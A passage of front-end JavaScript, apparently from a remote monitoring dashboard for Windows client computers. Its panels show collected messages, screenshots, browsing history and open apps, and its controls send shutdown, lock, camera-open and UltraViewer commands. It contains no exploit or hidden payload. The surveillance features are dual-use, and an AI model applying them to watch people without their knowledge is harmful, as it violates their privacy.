      eventSource = new EventSource(`/events${query}`);
      eventSource.onmessage = (event) => {
        const message = JSON.parse(event.data);
        currentMessages.push(message);
        if (currentMessages.length > 200) currentMessages.shift();
        showLiveNotification(message);
        queueFeedRender();
        statusEl.textContent = 'Live stream connected';
      };
      eventSource.onerror = () => {
        statusEl.textContent = 'Reconnect in progressâ€¦';
      };
    }

    async function selectDevice(deviceId) {
      if (selectedDeviceId === deviceId) return;
      selectedDeviceId = deviceId;
      const query = selectedDeviceId ? `/?device=${encodeURIComponent(selectedDeviceId)}` : '/';
      window.history.pushState({}, '', query);
      panelRequestId += 1;
      currentMessages = [];
      screenshotSignature = null;
      scopeLabelEl.textContent = `Device ${selectedDeviceId}`;
      controlsDeviceEl.textContent = `Selected device: ${selectedDeviceId}`;
      updateSelectedDeviceScreenshot();
      syncUpdateButtonState();
      if (eventSource) eventSource.close();
      await loadInitialMessages();
      connectEvents();
      await loadDevices();
      if (displayMode === 'screenshots') await loadScreenshots();
      if (displayMode === 'activity') await loadActivity();
      if (displayMode === 'controls') await loadCommandHistory();
    }

    function updateViewVisibility() {
      const isControlsView = displayMode === 'controls';
      const isFeedView = !isControlsView;
      rawHistoryControlsEl.hidden = displayMode !== 'raw-history';
      controlsPanelEl.hidden = !isControlsView;
      activityPanelEl.hidden = true;
      feed.hidden = !isFeedView;
      if (!isFeedView) {
        feed.innerHTML = '';
      }
    }

    document.querySelectorAll('[data-mode]').forEach((button) => {
      button.addEventListener('click', async () => {
        panelRequestId += 1;
        displayMode = button.dataset.mode;
        button.setAttribute('aria-busy', 'true');
        document.querySelectorAll('[data-mode]').forEach((item) => item.classList.toggle('active', item === button));
        updateViewVisibility();
        if (displayMode === 'raw-history') {
          if (eventSource) eventSource.close();
          await loadRawHistory();
        } else if (displayMode === 'screenshots') {
          if (eventSource) eventSource.close();
          await loadScreenshots();
        } else if (displayMode === 'controls') {
          if (eventSource) eventSource.close();
          statusEl.textContent = 'Device controls';
          await loadCommandHistory();
        } else if (displayMode === 'activity') {
          if (eventSource) eventSource.close();
          await loadActivity();
        } else {
          if (!eventSource || eventSource.readyState === EventSource.CLOSED) connectEvents();
          renderFeed();
        }
        button.removeAttribute('aria-busy');
      });
    });

    rawHistoryControlsEl.addEventListener('submit', (event) => {
      event.preventDefault();
      loadRawHistory();
    });

    async function requestClientCommand(command, button, confirmation) {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!window.confirm(confirmation)) return;
      button.disabled = true;
      controlsStatusEl.textContent = `Requesting client ${command}...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, { command });
        controlsStatusEl.textContent = `Client ${command} requested.`;
      } catch (err) {
        button.disabled = false;
        controlsStatusEl.textContent = `Client ${command} failed.`;
      }
    }

    function parseVersionParts(version) {
      const normalized = String(version || '').trim().replace(/^v/i, '').replace(/[^0-9.]+/g, '.');
      const parts = normalized.split('.').map((part) => Number.parseInt(part, 10) || 0);
      while (parts.length < 4) parts.push(0);
      return parts.slice(0, 4);
    }

    function compareVersions(currentVersion, latestVersion) {
      const currentParts = parseVersionParts(currentVersion);
      const latestParts = parseVersionParts(latestVersion);
      for (let index = 0; index < 4; index += 1) {
        if (currentParts[index] < latestParts[index]) return -1;
        if (currentParts[index] > latestParts[index]) return 1;
      }
      return 0;
    }

    function syncUpdateButtonState() {
      const selectedDevice = latestDevices.find((device) => String(device.id) === String(selectedDeviceId));
      if (!selectedDeviceId || !selectedDevice) {
        updateClientButtonEl.disabled = true;
        updateClientButtonEl.textContent = 'Update client';
        return;
      }
      const currentVersion = String(selectedDevice.client_version || '').trim();
      if (!currentVersion || currentVersion === 'unknown') {
        updateClientButtonEl.disabled = true;
        updateClientButtonEl.textContent = 'Version unknown';
        return;
      }
      fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/update-check`)
        .then((updateStatus) => {
          if (!updateStatus.ok) {
            updateClientButtonEl.disabled = true;
            updateClientButtonEl.textContent = 'Update unavailable';
            return;
          }
          const needsUpdate = Boolean(updateStatus.needs_update);
          updateClientButtonEl.disabled = !needsUpdate;
          updateClientButtonEl.textContent = needsUpdate ? 'Update client' : 'Latest version';
        })
        .catch(() => {
          updateClientButtonEl.disabled = true;
          updateClientButtonEl.textContent = 'Update unavailable';
        });
    }

    async function requestClientUpdate(button) {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      const selectedDevice = latestDevices.find((device) => String(device.id) === String(selectedDeviceId));
      if (!selectedDevice) {
        controlsStatusEl.textContent = 'Selected device is no longer available.';
        return;
      }
      const currentVersion = String(selectedDevice.client_version || '').trim();
      if (!currentVersion || currentVersion === 'unknown') {
        controlsStatusEl.textContent = 'The selected device version is unavailable, so no update comparison can be made.';
        return;
      }
      button.disabled = true;
      controlsStatusEl.textContent = `Checking latest release against client v${currentVersion}...`;
      try {
        const updateStatus = await fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/update-check`);
        if (!updateStatus.ok) {
          throw new Error(updateStatus.error || 'The update check failed.');
        }
        const latestVersion = String(updateStatus.latest_version || '').trim();
        const normalizedCurrent = currentVersion.replace(/^v/i, '');
        const normalizedLatest = latestVersion.replace(/^v/i, '');
        if (!updateStatus.needs_update) {
          controlsStatusEl.textContent = `Client is already up to date: v${normalizedCurrent} is current.`;
          updateClientButtonEl.disabled = true;
          updateClientButtonEl.textContent = 'Latest version';
          return;
        }
        const deviceLabel = selectedDevice.name || selectedDevice.id;
        if (!window.confirm(`Update ${deviceLabel} from v${normalizedCurrent} to v${normalizedLatest}?`)) {
          controlsStatusEl.textContent = 'Update cancelled.';
          return;
        }
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, { command: 'update_client' });
        controlsStatusEl.textContent = `Update requested for ${deviceLabel}: v${normalizedCurrent} -> v${normalizedLatest}.`;
        updateClientButtonEl.disabled = true;
        updateClientButtonEl.textContent = 'Update queued';
      } catch (err) {
        controlsStatusEl.textContent = `Could not check for client updates: ${err.message || String(err)}`;
      } finally {
        button.disabled = false;
      }
    }

    shutdownButtonEl.addEventListener('click', () => requestClientCommand(
      'shutdown', shutdownButtonEl, 'Shut down the selected client computer?'
    ));
    logoutClientButtonEl.addEventListener('click', () => requestClientCommand(
      'logout', logoutClientButtonEl, 'Log out the selected Windows user?'
    ));
    restartClientButtonEl.addEventListener('click', () => requestClientCommand(
      'restart', restartClientButtonEl, 'Restart the selected client computer?'
    ));
    lockClientButtonEl.addEventListener('click', () => requestClientCommand(
      'lock', lockClientButtonEl, 'Lock the selected client computer?'
    ));
    pauseClientButtonEl.addEventListener('click', () => requestClientCommand(
      'pause', pauseClientButtonEl, 'Pause collection on the selected client?'
    ));
    resumeClientButtonEl.addEventListener('click', () => requestClientCommand(
      'resume', resumeClientButtonEl, 'Resume collection on the selected client?'
    ));
    updateClientButtonEl.addEventListener('click', () => requestClientUpdate(updateClientButtonEl));

    function openCameraDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      cameraDialogTargetEl.textContent = `Applying to ${controlsDeviceEl.textContent}`;
      cameraDialogEl.showModal();
      cameraDurationEl.focus();
      cameraDurationEl.select();
    }

    function closeCameraDialog() {
      if (cameraDialogEl.open) cameraDialogEl.close();
    }

    disableCameraButtonEl.addEventListener('click', openCameraDialog);
    closeCameraButtonEl.addEventListener('click', closeCameraDialog);
    cancelCameraButtonEl.addEventListener('click', closeCameraDialog);
    openUltraViewerButtonEl.addEventListener('click', () => requestClientCommand(
      'open_ultraviewer', openUltraViewerButtonEl,
      'Open UltraViewer on the selected client?'
    ));

    cameraFormEl.addEventListener('submit', async (event) => {
      event.preventDefault();
      const seconds = Number.parseInt(cameraDurationEl.value, 10);
      if (!selectedDeviceId) {
        closeCameraDialog();
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!Number.isInteger(seconds) || seconds < 1 || seconds > 3600) {
        controlsStatusEl.textContent = 'Enter a duration from 1 to 3600 seconds.';
        cameraDurationEl.focus();
        return;
      }
      confirmCameraButtonEl.disabled = true;
      controlsStatusEl.textContent = `Opening camera for ${seconds} seconds...`;
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
          command: 'open_camera',
          message: String(seconds),
        });
        closeCameraDialog();
        controlsStatusEl.textContent = `Camera opened for ${seconds} seconds.`;
      } catch (err) {
        controlsStatusEl.textContent = 'Camera could not be opened.';
      } finally {
        confirmCameraButtonEl.disabled = false;
      }
    });

    function openScreenshotDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      screenshotDialogTargetEl.textContent = `Previewing ${controlsDeviceEl.textContent}`;
      const selectedDevice = latestDevices.find((device) => String(device.id) === String(selectedDeviceId));
      if (selectedDevice) {
        syncScreenshotPreviewState(selectedDevice, 'Requested', 'Requesting a fresh screenshot...');
      }
      if (typeof screenshotDialogEl.showModal === 'function') {
        try {
          screenshotDialogEl.showModal();
        } catch (err) {
          screenshotOverlayEl.hidden = false;
          screenshotOverlayEl.classList.add('show');
        }
      } else {
        screenshotOverlayEl.hidden = false;
        screenshotOverlayEl.classList.add('show');
      }
      if (screenshotOverlayEl && screenshotOverlayEl.hidden === false) {
        screenshotOverlayEl.classList.add('show');
      }
      if (screenshotStatusTimer) clearInterval(screenshotStatusTimer);
      screenshotStatusTimer = setInterval(async () => {
        if (!screenshotOverlayEl.hidden && !selectedDeviceId) {
          clearInterval(screenshotStatusTimer);
          screenshotStatusTimer = null;
          return;
        }
        await loadDevices();
        const currentDevice = latestDevices.find((device) => String(device.id) === String(selectedDeviceId));
        if (!currentDevice) {
          clearInterval(screenshotStatusTimer);
          screenshotStatusTimer = null;
          return;
        }
        const status = currentDevice.screenshot_status || 'Ready';
        if (!['Requested', 'Taking screenshot', 'Capturing', 'Uploading'].includes(status)) {
          clearInterval(screenshotStatusTimer);
          screenshotStatusTimer = null;
        }
        syncScreenshotPreviewState(currentDevice, status, currentDevice.screenshot_message || 'Ready to capture');
      }, 1000);
    }

    function closeScreenshotDialog() {
      if (screenshotStatusTimer) {
        clearInterval(screenshotStatusTimer);
        screenshotStatusTimer = null;
      }
      if (typeof screenshotDialogEl.close === 'function' && screenshotDialogEl.open) {
        screenshotDialogEl.close();
      }
      if (screenshotOverlayEl) {
        screenshotOverlayEl.classList.remove('show');
        screenshotOverlayEl.hidden = true;
      }
    }

    captureScreenshotButtonEl.addEventListener('click', async () => {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      openScreenshotDialog();
      captureScreenshotButtonEl.disabled = true;
      screenshotDialogStatusEl.textContent = 'Requesting screenshot...';
      screenshotDialogStatusEl.className = 'controls-screenshot-status requested';
      try {
        const response = await fetch(`/api/devices/${encodeURIComponent(selectedDeviceId)}/screenshot`, { method: 'POST' });
        if (!response.ok) throw new Error('request failed');
        controlsStatusEl.textContent = 'Screenshot queued for the selected client.';
        screenshotDialogStatusEl.textContent = 'Screenshot requested';
        screenshotDialogStatusEl.className = 'controls-screenshot-status requested';
        await loadDevices();
      } catch (err) {
        controlsStatusEl.textContent = 'Screenshot request failed.';
        screenshotDialogStatusEl.textContent = 'Screenshot request failed';
        screenshotDialogStatusEl.className = 'controls-screenshot-status failed';
        updateSelectedDeviceScreenshot();
      }
    });

    logoutDashboardButtonEl.addEventListener('click', () => {
      window.location.assign('/logout');
    });

    closeScreenshotButtonEl.addEventListener('click', closeScreenshotDialog);
    cancelScreenshotButtonEl.addEventListener('click', closeScreenshotDialog);
    confirmScreenshotButtonEl.addEventListener('click', async () => {
      captureScreenshotButtonEl.click();
    });

    function openMessageDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      messageDialogTargetEl.textContent = `Sending to ${controlsDeviceEl.textContent}`;
      messageDialogEl.showModal();
      clientMessageEl.focus();
    }

    function closeMessageDialog() {
      if (messageDialogEl.open) messageDialogEl.close();
    }

    async function openTodayHistoryDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!historyDialogEl.open) historyDialogEl.showModal();
      todayHistoryTargetEl.textContent = `Viewing ${controlsDeviceEl.textContent}`;
      todayHistoryListEl.innerHTML = '<div class="history-empty">Loading web history...</div>';
      try {
        const items = await fetchJson(`/api/website-history?device_id=${encodeURIComponent(selectedDeviceId)}`);
        const sevenDaysAgoMs = Date.now() - (7 * 24 * 60 * 60 * 1000);
        const recentEntries = (items || [])
          .filter((entry) => Number(entry.visited_at) >= sevenDaysAgoMs)
          .sort((a, b) => Number(b.visited_at) - Number(a.visited_at));

        todayHistoryListEl.innerHTML = '';
        if (!recentEntries.length) {
          todayHistoryListEl.innerHTML = '<div class="history-empty">No web history recorded in the last 7 days.</div>';
          return;
        }

        const list = document.createElement('ul');
        list.className = 'history-items';
        recentEntries.forEach((entry) => {
          const item = document.createElement('li');
          item.className = 'history-item';
          const time = document.createElement('span');
          time.className = 'history-time';
          time.textContent = formatTime(Number(entry.visited_at));
          const browser = document.createElement('span');
          browser.className = 'history-browser';
          browser.textContent = `${entry.browser || 'Unknown browser'}`;
          const link = document.createElement('a');
          link.className = 'history-link';
          link.href = entry.url;
          link.target = '_blank';
          link.rel = 'noopener noreferrer';
          link.textContent = entry.url;
          item.append(time, browser, link);
          list.appendChild(item);
        });
        todayHistoryListEl.appendChild(list);
      } catch (err) {
        todayHistoryListEl.innerHTML = '<div class="history-empty">Web history is unavailable.</div>';
      }
    }

    function closeHistoryDialog() {
      if (historyDialogEl.open) historyDialogEl.close();
    }

    async function openVisitedLinksDialog() {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!visitedLinksDialogEl.open) visitedLinksDialogEl.showModal();
      visitedLinksTargetEl.textContent = `Viewing visited links for ${controlsDeviceEl.textContent}`;
      visitedLinksListEl.innerHTML = '<div class="history-empty">Loading saved visits...</div>';
      try {
        const items = await fetchJson(`/api/visited-links?device_id=${encodeURIComponent(selectedDeviceId)}`);
        const sortedEntries = (items || []).sort((a, b) => Number(b.visited_at) - Number(a.visited_at));
        visitedLinksListEl.innerHTML = '';
        if (!sortedEntries.length) {
          visitedLinksListEl.innerHTML = '<div class="history-empty">No visited links saved for this device.</div>';
          return;
        }

        const groupMap = new Map();
        sortedEntries.forEach((entry) => {
          const dateKey = new Date(Number(entry.visited_at)).toISOString().slice(0, 10);
          if (!groupMap.has(dateKey)) groupMap.set(dateKey, []);
          groupMap.get(dateKey).push(entry);
        });

        const groups = Array.from(groupMap.entries()).sort((a, b) => b[0].localeCompare(a[0]));
        groups.forEach(([dateKey, entries]) => {
          const group = document.createElement('div');
          group.className = 'history-date-group';
          const dateLabel = document.createElement('div');
          dateLabel.className = 'history-date';
          dateLabel.textContent = new Date(`${dateKey}T00:00:00`).toLocaleDateString(undefined, { dateStyle: 'medium' });
          const list = document.createElement('ul');
          list.className = 'history-items';
          entries.forEach((entry) => {
            const item = document.createElement('li');
            item.className = 'history-item';
            const time = document.createElement('span');
            time.className = 'history-time';
            time.textContent = formatTime(Number(entry.visited_at));
            const browser = document.createElement('span');
            browser.className = 'history-browser';
            browser.textContent = `${entry.browser || 'Unknown browser'}`;
            const link = document.createElement('a');
            link.className = 'history-link';
            link.href = entry.url;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            link.textContent = entry.url;
            item.append(time, browser, link);
            list.appendChild(item);
          });
          group.append(dateLabel, list);
          visitedLinksListEl.appendChild(group);
        });
      } catch (err) {
        visitedLinksListEl.innerHTML = '<div class="history-empty">Visited links are unavailable.</div>';
      }
    }

    function closeVisitedLinksDialog() {
      if (visitedLinksDialogEl.open) visitedLinksDialogEl.close();
    }

    openMessageButtonEl.addEventListener('click', openMessageDialog);
    closeMessageButtonEl.addEventListener('click', closeMessageDialog);
    cancelMessageButtonEl.addEventListener('click', closeMessageDialog);
    todayHistoryButtonEl.addEventListener('click', openTodayHistoryDialog);
    visitedLinksButtonEl.addEventListener('click', openVisitedLinksDialog);
    closeHistoryButtonEl.addEventListener('click', closeHistoryDialog);
    closeHistoryDialogButtonEl.addEventListener('click', closeHistoryDialog);
    closeVisitedLinksButtonEl.addEventListener('click', closeVisitedLinksDialog);
    closeVisitedLinksDialogButtonEl.addEventListener('click', closeVisitedLinksDialog);
    clientMessageEl.addEventListener('input', () => {
      messageLengthEl.textContent = `${clientMessageEl.value.length} / 2000`;
    });
    clientImageEl.addEventListener('change', () => {
      clientImageNameEl.textContent = clientImageEl.files[0]?.name || 'No image selected';
    });

    messageComposeEl.addEventListener('submit', async (event) => {
      event.preventDefault();
      const message = clientMessageEl.value.trim();
      const imageFile = clientImageEl.files[0];
      const targetDeviceId = selectedDeviceId;
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      if (!message && !imageFile) {
        controlsStatusEl.textContent = 'Write a message or choose an image first.';
        if (!message) clientMessageEl.focus();
        return;
      }
      if (imageFile && imageFile.size > 10 * 1024 * 1024) {
        controlsStatusEl.textContent = 'Choose an image smaller than 10 MB.';
        return;
      }
      sendMessageButtonEl.disabled = true;
      controlsStatusEl.textContent = imageFile ? 'Uploading image...' : 'Sending message...';
      try {
        if (imageFile) {
          const formData = new FormData();
          formData.append('file', imageFile);
          const uploadResponse = await fetch('/api/devices/media-upload', { method: 'POST', body: formData });
          if (!uploadResponse.ok) throw new Error(`Image upload failed: ${uploadResponse.status}`);
          const uploadedImage = await uploadResponse.json();
          controlsStatusEl.textContent = 'Queueing image for the client...';
          await postJson(`/api/devices/${encodeURIComponent(targetDeviceId)}/command`, {
            command: 'show_image',
            message: JSON.stringify({ attachment_id: uploadedImage.attachment_id, caption: message })
          });
        } else {
          await postJson(`/api/devices/${encodeURIComponent(targetDeviceId)}/command`, { command: 'message', message });
        }
        clientMessageEl.value = '';
        clientImageEl.value = '';
        clientImageNameEl.textContent = 'No image selected';
        messageLengthEl.textContent = '0 / 2000';
        closeMessageDialog();
        controlsStatusEl.textContent = imageFile ? 'Image queued for the selected client.' : 'Message queued for the selected client.';
      } catch (err) {
        controlsStatusEl.textContent = imageFile ? 'Image could not be sent.' : 'Message could not be sent.';
      } finally {
        sendMessageButtonEl.disabled = false;
      }
    });

    refreshButtonEl.addEventListener('click', () => window.location.reload());

    async function loadCommandHistory() {
      commandHistoryEl.innerHTML = '';
      if (!selectedDeviceId) {
        commandHistoryEl.textContent = 'Select a device to view command history.';
        return;
      }
      try {
        const commands = await fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/commands`);
        if (!commands.length) {
          commandHistoryEl.textContent = 'No commands recorded yet.';
          return;
        }
        commands.forEach((command) => {
          const item = document.createElement('div');
          item.className = 'command-history-item';
          item.textContent = `${command.command} | ${command.status} | ${formatTime(command.created_at)}`;
          commandHistoryEl.appendChild(item);
        });
      } catch (err) {
        commandHistoryEl.textContent = 'Command history unavailable.';
      }
    }

    activityButtonEl.addEventListener('click', async () => {
      if (activityDialogEl.open) {
        activityDialogEl.close();
        return;
      }
      activityPanelEl.hidden = true;
      if (typeof activityDialogEl.showModal === 'function') {
        activityDialogEl.showModal();
      }
      await loadActivity();
    });

    closeActivityButtonEl.addEventListener('click', () => {
      if (typeof activityDialogEl.close === 'function') {
        activityDialogEl.close();
      }
    });

    closeActivityDialogButtonEl.addEventListener('click', () => {
      if (typeof activityDialogEl.close === 'function') {
        activityDialogEl.close();
      }
    });

    async function loadActivity() {
      const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
      try {
        const activity = await fetchJson(`/api/activity${query}`);
        const renderActivitySummary = (container) => {
          container.innerHTML = '';
          [[activity.messages, 'Messages'], [activity.website_visits, 'Website visits'], [activity.raw_events, 'Raw events']].forEach(([value, label]) => {
            const stat = document.createElement('div');
            stat.className = 'activity-stat';
            stat.textContent = `${value} ${label}`;
            container.appendChild(stat);
          });
        };
        renderActivitySummary(activityStatsEl);
        renderActivitySummary(activityDialogStatsEl);
        const renderList = (container, values) => {
          container.innerHTML = '';
          values.forEach(([name, count]) => {
            const item = document.createElement('li');
            item.textContent = `${name}: ${count}`;
            container.appendChild(item);
          });
          if (!values.length) container.innerHTML = '<li>No data yet</li>';
        };
        renderList(topAppsEl, activity.top_apps);
        renderList(topDomainsEl, activity.top_domains);
        renderList(topAppsDialogEl, activity.top_apps);
        renderList(topDomainsDialogEl, activity.top_domains);
        const suffix = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const csvHref = `/api/export/messages${suffix}`;
        const jsonHref = `/api/export/messages?format=json${selectedDeviceId ? `&device_id=${encodeURIComponent(selectedDeviceId)}` : ''}`;
        exportCsvLinkEl.href = csvHref;
        exportJsonLinkEl.href = jsonHref;
        exportCsvLinkDialogEl.href = csvHref;
        exportJsonLinkDialogEl.href = jsonHref;
        await loadDeviceDetail();
        statusEl.textContent = 'Activity summary loaded';
      } catch (err) {
        statusEl.textContent = 'Activity unavailable';
      }
    }

    async function loadDeviceDetail() {
      let updateLabel = 'Update status unavailable';
      const fillContainer = (container, payload) => {
        container.innerHTML = '';
        if (!selectedDeviceId) {
          container.textContent = 'Select a device to view detailed telemetry.';
          return;
        }
        if (!payload) {
          container.textContent = 'Device detail unavailable.';
          return;
        }
        const device = payload.device;
        const heading = document.createElement('h3');
        heading.textContent = `${device.name || 'Unknown device'} (${device.id})`;
        const summary = document.createElement('p');
        summary.textContent = `${device.online ? 'Online' : 'Offline'} | Client v${device.client_version || 'unknown'} | ${device.logged_in_user || 'Unknown user'} | ${device.battery_status || 'Battery unknown'}${device.battery_percent == null ? '' : ` ${device.battery_percent}%`}`;
        const health = document.createElement('p');
        health.textContent = `Update: ${updateLabel} | History sync: ${device.website_history_status || 'No report'}${device.website_history_message ? ` (${device.website_history_message})` : ''} | Screenshot: ${device.screenshot_status || 'Ready'}${device.screenshot_message ? ` (${device.screenshot_message})` : ''}`;
        const network = document.createElement('p');
        network.textContent = `Public IP: ${device.client_ip || 'Unknown'} | Local IP: ${device.local_ip || 'Unknown'}`;
        const apps = document.createElement('p');
        apps.textContent = `Open applications: ${(device.open_apps || []).join(', ') || 'None reported'}`;
        const commands = document.createElement('p');
        commands.textContent = `Recent commands: ${(payload.commands || []).map((item) => `${item.command} (${item.status})`).join(', ') || 'None'}`;
        container.append(heading, summary, health, network, apps, commands);
      };

      if (!selectedDeviceId) {
        fillContainer(deviceDetailEl, null);
        fillContainer(deviceDetailDialogEl, null);
        return;
      }

      try {
        const [detail, updateStatus] = await Promise.all([
          fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/detail`),
          fetchJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/update-check`).catch(() => null),
        ]);
        updateLabel = updateStatus?.ok
          ? (updateStatus.needs_update ? `Update available (${updateStatus.latest_version || 'new version'})` : 'Up to date')
          : 'Update status unavailable';
        fillContainer(deviceDetailEl, detail);
        fillContainer(deviceDetailDialogEl, detail);
      } catch (err) {
        fillContainer(deviceDetailEl, null);
        fillContainer(deviceDetailDialogEl, null);
      }
    }

    messageSearchEl.addEventListener('input', queueFeedRender);
    window.addEventListener('keydown', (event) => {
      if (event.key === '/' && document.activeElement !== messageSearchEl) {
        event.preventDefault();
        messageSearchEl.focus();
      }
    });

    scopeLabelEl.textContent = selectedDeviceId ? `Device ${selectedDeviceId}` : 'All devices';
    controlsDeviceEl.textContent = selectedDeviceId
      ? `Selected device: ${selectedDeviceId}`
      : 'Select a device from the device list to enable client actions.';
    updateSelectedDeviceScreenshot();
    async function startApp() {
      await loadInitialMessages();
      connectEvents();
      loadConfig();
      loadHealth();
      loadDevices();
    }

    startApp();
    setInterval(updateUptime, 1000);
    setInterval(updateDeviceUptimes, 1000);
    setInterval(loadHealth, 30000);
    setInterval(loadDevices, 3000);
    setInterval(() => {
      if (displayMode === 'screenshots') loadScreenshots();
    }, 15000);

